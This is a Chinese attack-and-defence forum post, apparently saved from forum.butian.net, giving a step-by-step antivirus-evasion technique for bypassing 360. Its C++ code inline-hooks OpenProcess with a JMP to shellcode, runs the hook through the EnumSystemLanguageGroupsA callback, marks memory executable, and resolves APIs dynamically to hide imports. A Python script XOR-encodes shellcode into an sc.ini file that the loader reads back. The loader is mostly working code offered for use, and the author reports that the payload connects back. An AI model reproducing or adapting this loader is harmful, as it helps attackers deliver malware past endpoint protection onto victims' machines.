<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [forum.butian.net](https://forum.butian.net/share/1824)

> 奇安信攻防社区 - inline hook 实现免杀 360

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-0615c0505f0c0f05107afb2cd024866947f5f770.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-8c57901a9213d9d08fc6d6df4c16c94e9cdbe743.png)

**1.shellcode 的加解密**

这里我依旧是使用简单的异或和我上一篇文章的`GetPrivateProfileIntA`这个 api 来获取加密后的 shellcode，只不过改进了一下，上一篇文章地址 [https://forum.butian.net/share/1805](https://forum.butian.net/share/1805)

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-115517c15602a78c1b46d3e2cc720125e04d12dd.png)

**2.virtualprotect**

官方介绍地址 [https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)  
简单来说可以把一块内存变为可写可读可执行

**3.EnumSystemLanguageGroupsA**

这个 api 的第一个参数是回调函数的指针，我们可以利用这一个参数执行我们的 shellcode

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-8da1294b47be601f0d45123a541809864a225bb2.png)  
剩余的参数跟着文档随便填即可，官方介绍 [https://docs.microsoft.com/en-us/windows/win32/api/winnls/nf-winnls-enumsystemlanguagegroupsa](https://docs.microsoft.com/en-us/windows/win32/api/winnls/nf-winnls-enumsystemlanguagegroupsa)

**4.WriteProcessMemory**

该 api 在指定进程中写入内存，官方介绍 [https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)

**5.GetProcAddress 和 GetModuleHandleA**

利用这两个 api 可以获取某个 api 的地址，从而利用函数指针进行动态调用

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-66b992f9a1bffe5c5d9e52af7d5103f36359b3ad.png)  
可以看到成功打印 openprocess 这个 api 的地址

**6.GetCurrentProcess**  
这个 api 是获取当前进程的句柄

**7.inline hook**  
inline hook 的可以拦截某个 api，当调用那个 api 的时候可以跳转到我们自定义的函数，这个时候我们可以跳转到我们的 shellcode，从而执行 shellcode

它的实现是更改程序写入`jmp 地址`来实现跳转，jmp 指令一共需要 5 个字节，jmp 对应的机器码为 E9，在 jmp 命令中，后面跟的地址是偏移地址，而不是具体的地址，在 inline hook 中它的偏移地址计算公式为 `偏移量=目标地址-原始地址-5`，我们在使用时只需记住这个公式即可

师傅们可以在 b 站看下这个视频 [https://www.bilibili.com/video/BV1Ap4y1h72r?spm\_id\_from=333.337.search-card.all.click](https://www.bilibili.com/video/BV1Ap4y1h72r?spm%5C_id%5C_from=333.337.search-card.all.click)

**8,GetCurrentDirectoryA**  
该函数获取当前目录

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-f787cffb9dd845099c0079d452d200094e94bb05.png)  
**9.strcat**  
字符串拼接

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-cbe3d0b681fb33959a764aef8024c7112d99627f.png)  
**10.**`#pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup")`  
**作用是不显示黑窗口**

**本文 inline hook 实现免杀流程：  
1. 构造跳转指令  
2. 找到要 hook 的函数地址，把该函数的前 5 个字节改成我们跳转到 shllcode 的恶意指令  
3. 运行该函数**

我们写一个类，类名为 InLine，类中定义这三个成员变量

```
BYTE NewByte[5]={0};//保存我们构造的jmp跳转指令
PROC FuncAddr;//存放需要跳转的函数地址
PROC HookFunc;//存放需要hook的api地址
```

然后在写一个构造函数

```
InLine(PROC Func){
    FuncAddr=Func;//把func赋值给FuncAddr
    if (FuncAddr == NULL) {
        exit(1);
    } //这里判段我们需要跳转到的函数的地址是否为空，如果为空，则退出
    hookFunc = GetProcAddress(
        GetModuleHandleA("Kernel32.dll"),
        "OpenProcess"
    );//这里是获取我们需要hook的api的地址，我们这里是hook OpenProcess这个api
    if (hookFunc == NULL) {
        exit(1);
    } //这里判段需要hook的api是否为空，如果是则退出
    SIZE_T d;
    Newbyte[0] = '\xE9';//这里构建jmp指令
    *(DWORD*)(Newbyte + 1) = (DWORD)FuncAddr - (DWORD)hookFunc - 5;//这里加1是为了不把jmp给覆盖，然后把偏移地址赋值到NewByte中
    WriteProcessMemory(GetCurrentProcess(), hookFunc, Newbyte, 5, &d);//这里就是把定义好的跳转指令写入到我们需要hook的api的前5个字节中
    EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)hookFunc, LGRPID_INSTALLED, NULL);//这个api作用是利用第一个参数（回调函数）来执行我们修改了前5个字节的api
 }
```

我们的 hook 代码已经写完了，现在只需要把我们的 shellcode 所在的地方改为可执行，并且把 shellcode 的地址赋值给类中的 funcaddr 即可

```
unsigned char buf[] ="这里是shellcode";
    DWORD i;
    VirtualProtect(&buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &i);//PAGE_EXECUTE_READWRITE代表可读可写可执行
    InLine bh((PROC)&buf);
```

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-46e683abcec0cdeadbf434e12087a47be3620e04.png)  
可以看到 shellcode 正常上线

接下来我们用 GetProcAddress 和 GetModuleHandleA 这两个 api 来动态调用我们的一些 api

```
typedef BOOL(WINAPI* Write)(
    HANDLE      hprocess,
    LPVOID      BaseAddr,
    LPCVOID     BUffer,
    SIZE_T      Size,
    SIZE_T*     NumberOfBytes
    );
Write Writer = (Write)GetProcAddress(
    GetModuleHandleA("Kernel32.dll"),
    "WriteProcessMemory"
);

typedef BOOL(WINAPI* vp)(
    LPVOID      Address,
    DWORD       size,
    DWORD       New,
    PDWORD      Old
    );
vp vip = (vp)GetProcAddress(
    GetModuleHandleA("Kernel32.dll"),
    "VirtualProtect"
);
```

随后我们把代码中的 writeprocessmemory 和 virtualprotect 这两个 api 分别换成 Writer 和 vip

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-ecf1828a2e222600e13a83da3a9d1c7131a57a7a.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-f3b92a58d0d73ff602f4b7bf3f18eb18624adf55.png)

**一切准备就绪，就差 shellcode 的加解密了**  
这里我用上一篇文章的方法，脚本也和上一篇文章一模一样，这里就不在多说了  
![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-00c6f4772daf24193f30a598ed78e7c98fdc7d71.png)

```
char path[MAX_PATH];
char abc[3000];
unsigned char cba[3000];
DWORD d;
vip(cba, sizeof(cba), PAGE_EXECUTE_READWRITE, &d);
GetCurrentDirectoryA(MAX_PATH, path);
strcat(path, "\\sc.ini");
for (int i = 0; i < 3000; i++) {
    _itoa_s(i, abc, 10);
    UINT ok = GetPrivateProfileIntA("key", abc, NULL, path);
    if (ok == 0) {break;}
    cba[i] = ok^1024;
}
InLine I((PROC)&cba);
```

Python shellcode 加密代码（简单的异或加密）：

```
print(" _")
print("| |__  _   _ _ __   __ _ ___ ___")
print("| '_ \| | | | '_ \ / _` / __/ __|")
print("| |_) | |_| | |_) | (_| \__ \__ \\")
print("|_.__/ \__, | .__/ \__,_|___/___/")
print("       |___/|_|")
shellcode_=b"" #shellcode放在这里shellcode放在这里
shellcode=[]
for i in shellcode_:
    shellcode.append(str(i^1024))
shellcode=",".join(shellcode).split(",")
file=open("sc.ini","w")
file.write("[key]\n")
n=0
for i in shellcode:
    file.write(f"{n}={i}\n")
    n+=1
file.close()
```

随后把 sc.ini 文件和 exe 文件放在同一目录运行后可以正常上线

![](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-c24b6b4c2a5b51defbbae0d038e8f91470edfc5a.png)

在命令行使用的时候，需要 cd 到 exe 和 sc.ini 文件所在的目录，不然无法上线!!!

完整代码我发在了 github 上，地址 [https://github.com/wz-wsl/360bypass](https://github.com/wz-wsl/360bypass)

师傅们可以把 SMC 技术用到免杀上来，最后祝各位师傅们玩得开心呀！